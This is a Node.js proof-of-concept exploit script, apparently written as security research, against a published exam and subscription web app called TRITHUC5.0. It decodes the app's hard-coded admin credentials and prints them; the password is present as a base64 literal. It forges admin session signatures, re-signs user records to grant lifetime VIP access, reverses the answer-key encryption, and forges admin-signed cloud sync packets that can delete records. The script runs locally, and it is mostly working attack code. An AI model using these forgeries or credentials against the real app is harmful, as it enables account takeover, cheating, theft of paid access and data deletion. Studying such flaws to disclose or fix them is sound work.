// poc_client.js — client-side verification of TRITHUC5.0 V4.3.9 protections.
// Reads the local read-only copy of the published HTML and executes the REAL
// functions extracted from it, with no server writes and no account creation.
// Usage: node research/trithuc5/poc/poc_client.js

'use strict';
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const SOURCE = path.join(__dirname, '..', 'index.html');
const text = fs.readFileSync(SOURCE, 'utf8');
const lines = text.split(/\r?\n/);
const sha = crypto.createHash('sha256').update(text).digest('hex');

function assert(marker, ok) {
    if (!ok) throw new Error('ASSERT FAILED: ' + marker);
    console.log('  [ok] ' + marker);
}

// --- Extract real source slices by function name; assert identity before use ---
function extractFunction(name, nextMarker) {
    const start = lines.findIndex(l => new RegExp('^\\s*function\\s+' + name + '\\s*\\(').test(l));
    if (start < 0) throw new Error('function not found: ' + name);
    let end = start + 1;
    if (nextMarker) {
        while (end < lines.length && !lines[end].includes(nextMarker)) end++;
        if (end === lines.length) throw new Error('next marker not found for ' + name);
    } else {
        // balanced braces
        let depth = 0, seen = false;
        for (let i = start; i < lines.length; i++) {
            for (const ch of lines[i]) {
                if (ch === '{') { depth++; seen = true; }
                else if (ch === '}') depth--;
            }
            if (seen && depth === 0) { end = i + 1; break; }
        }
    }
    return { code: lines.slice(start, end).join('\n'), start: start + 1, end };
}

const fns = ['hashStringHex', 'computeUserIntegritySig', 'computeAdminSessionSig',
    'computeCloudPacketAdminSig', 'decryptV97EmbedPayload',
    'toBase64UrlSafe', 'fromBase64UrlSafe'];
const extracted = {};
for (const f of fns) extracted[f] = extractFunction(f);
console.log('SOURCE sha256: ' + sha);
console.log('Extracted functions (name : source lines):');
for (const f of fns) console.log(`  ${f} : ${extracted[f].start}-${extracted[f].end}`);
assert('integrity salt is literal in source',
    extracted.computeUserIntegritySig.code.includes('TRITHUC50_SEC_SALT_2026_V27'));
assert('admin session salt is literal in source',
    extracted.computeAdminSessionSig.code.includes('TRITHUC50_ADM_SALT_V27'));
assert('cloud packet secret is literal in source',
    extracted.computeCloudPacketAdminSig.code.includes('THAYTRUNG_SECRET_2026_V436'));

const api = new Function(
    extracted.hashStringHex.code + '\n' +
    extracted.computeUserIntegritySig.code + '\n' +
    extracted.computeAdminSessionSig.code + '\n' +
    extracted.computeCloudPacketAdminSig.code + '\n' +
    extracted.decryptV97EmbedPayload.code + '\n' +
    extracted.toBase64UrlSafe.code + '\n' +
    extracted.fromBase64UrlSafe.code + '\n' +
    'return {hashStringHex,computeUserIntegritySig,computeAdminSessionSig,computeCloudPacketAdminSig,decryptV97EmbedPayload,toBase64UrlSafe,fromBase64UrlSafe};'
)();

// --- 1. Admin credentials hard-coded as base64 ---
const adminLine = lines.findIndex(l => l.includes("adminCreds: {"));
assert('adminCreds block found', adminLine >= 0);
const b64s = lines.slice(adminLine, adminLine + 5).map(l => (l.match(/atob\('([^']+)'\)/) || [])[1]).filter(Boolean);
assert('two atob literals in adminCreds block', b64s.length === 2);
const decodedCreds = b64s.map(b => Buffer.from(b, 'base64').toString('utf8'));
console.log('  decoded admin username: ' + decodedCreds[0]);
console.log('  decoded admin password: ' + decodedCreds[1]);
assert('login accepts hardcoded admin alias (source line 13999)',
    lines[13998].includes("atob('YWRtaW4=')"));
assert('login accepts hardcoded password again (source line 14000)',
    lines[13999].includes("atob('VEhBWVRSVU5HMjAyNg==')"));

// --- 2. Forge remembered admin session ---
const ts = 1795000000000;
const forgedSession = { loggedIn: true, username: decodedCreds[0], ts,
    sig: api.computeAdminSessionSig(decodedCreds[0], ts) };
console.log('  forged session object: ' + JSON.stringify(forgedSession));
assert('loader would accept this sig (line 2404 comparison)',
    lines[2403].includes('parsedSess.sig === expectedSig'));
assert('loader accepts missing sig entirely (line 2404 !parsedSess.sig)',
    lines[2403].includes('!parsedSess.sig'));

// --- 3. Recompute user integrity sig after VIP/device tampering ---
const sampleUser = {
    id: 'stu_local_poc', username: 'poc_student', status: 'active',
    vipPackages: { k12: false, k11: false, k10: false, luyende: false },
    vipPlan: 'none', vipExpiresAt: null, gmail: 'poc@gmail.com', maxDevices: 2
};
const origSig = api.computeUserIntegritySig(sampleUser);
const tampered = JSON.parse(JSON.stringify(sampleUser));
tampered.vipPackages = { k12: true, k11: true, k10: true, luyende: true };
tampered.vipPlan = 'lifetime';
tampered.vipExpiresAt = null;
tampered.maxDevices = 999;
tampered._sig = api.computeUserIntegritySig(tampered);
console.log('  original _sig:  ' + origSig);
console.log('  recomputed _sig:' + tampered._sig);
assert('forged signature differs and is generated by the app function',
    origSig !== tampered._sig && /^v27_[0-9a-f]{16}$/.test(tampered._sig));
assert('verifier only compares to recomputed value (line 2832)',
    lines[2831].includes('stu._sig !== expected'));

// --- 4. Answer payload: decrypt algorithm + plaintext answer keys already shipped ---
const encLineIdx = lines.findIndex(l => l.startsWith('window.__INITIAL_EXAMS_DATA__'));
assert('__INITIAL_EXAMS_DATA__ present', encLineIdx >= 0);
const rawExamLine = lines[encLineIdx].replace(/^window\.__INITIAL_EXAMS_DATA__\s*=\s*/, '');
const closeIdx = rawExamLine.lastIndexOf('];');
assert('exam data array terminator found', closeIdx > 0);
const exams = JSON.parse(rawExamLine.slice(0, closeIdx + 1));
const firstAnswers = exams[0].correctAnswers;
console.log('  exams in bundled data: ' + exams.length);
console.log('  exam[0].correctAnswers.p1: ' + JSON.stringify(firstAnswers.p1));
assert('answer keys are plaintext in the shipped HTML', !!firstAnswers);

const sigValue = 'SAMPLE_SIG_FROM_SOURCE';
const keyStr = 'TRUNG_SEC_2026_' + sigValue;
const plain = JSON.stringify({ examId: exams[0].id, correctAnswers: firstAnswers });
const plainBytes = Buffer.from(plain, 'utf8');
const enc = Buffer.alloc(plainBytes.length);
// Inverse of the shipped decrypt: dec = ((enc ^ k) - shift + 256) % 256
// therefore enc = ((dec + shift) % 256) ^ k.
for (let i = 0; i < plainBytes.length; i++) {
    const k = keyStr.charCodeAt(i % keyStr.length);
    enc[i] = ((plainBytes[i] + ((i * 7) % 256)) % 256) ^ k;
}
const encB64 = enc.toString('base64');
const round = api.decryptV97EmbedPayload(encB64, sigValue);
console.log('  synthetic ENC_PAYLOAD length: ' + encB64.length);
console.log('  decrypt(correctAnswers match): ' + (JSON.stringify(round && round.correctAnswers) === JSON.stringify(firstAnswers)));
assert('decryptV97EmbedPayload reverses the XOR/subtract transform',
    !!round && JSON.stringify(round.correctAnswers) === JSON.stringify(firstAnswers));
assert('no live ENC_PAYLOAD constant in shipped HTML (only parser)',
    !lines.some(l => /^\s*(const|let|var)\s+ENC_PAYLOAD\s*=/.test(l)));

// --- 5. Cloud packet signature is forgeable from published constants ---
const pkt = {
    app: 'TRITHUC50_V436', type: 'CLOUD_STATE_SYNC', ts,
    fromAdmin: true, hideAuthorInfo: true,
    deletedMap: { poc_local_only: ts },
    users: [{ u: 'poc_student', vp: ['1', '1', '1', '1'], st: 'active' }]
};
pkt.adminSig = api.computeCloudPacketAdminSig(pkt);
console.log('  forged adminSig: ' + pkt.adminSig);
assert('verifier line 3145 treats missing adminSig as valid',
    lines[3144].includes('!data.adminSig'));
assert('tombstone deletion is applied before admin verification (line 3161)',
    lines[3160].includes('data.deletedMap'));
assert('ntfy topic is a public hardcoded constant (line 2918)',
    lines[2917].includes("trithuc50_v436_live_sync_hn"));
assert('KV app key is a public hardcoded constant (line 2922)',
    lines[2921].includes("'tt50v436hn'"));
assert('ntfy POST carries no auth header (line 3313)',
    lines[3312].includes("'Content-Type'") && !lines.slice(3305, 3320).some(l => /Authorization|token|apikey/i.test(l)));

console.log('\nPOC RESULT: all checks executed locally; no writes to ntfy/KV, no account created.');
